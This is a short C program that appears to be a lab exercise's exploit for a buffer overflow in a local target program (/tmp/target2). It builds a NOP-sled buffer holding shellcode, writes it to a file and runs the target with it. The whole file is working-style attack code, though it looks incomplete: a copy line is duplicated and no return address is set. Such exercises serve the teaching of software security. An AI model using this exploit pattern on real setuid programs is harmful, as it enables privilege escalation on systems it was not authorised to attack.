#include <string.h>
#include <unistd.h>
#include "shellcode.h"
#include "write_xploit.h"

#define TARGET "/tmp/target2"
#define DEFAULT_OUTPUT "/tmp/xploit2_output"


int main(int argc, char *argv[])
{
  char exploit[129];

  memset(exploit, '\x90', sizeof(exploit));

  memcpy(exploit + 10, shellcode, sizeof(shellcode) - 1);
  memcpy(exploit + 10, shellcode, sizeof(shellcode) - 1);

  *(exploit + 128) = 0x00;

  // Write the exploit buffer to a file
  write_xploit(exploit, sizeof(exploit), DEFAULT_OUTPUT);

  char *args[] = { TARGET, DEFAULT_OUTPUT, NULL };
  char *env[] = { NULL };
  execve(TARGET, args, env);
  perror("execve failed");
  fprintf(stderr, "try running \"sudo make install\" in the targets directory\n");

  return 0;
}
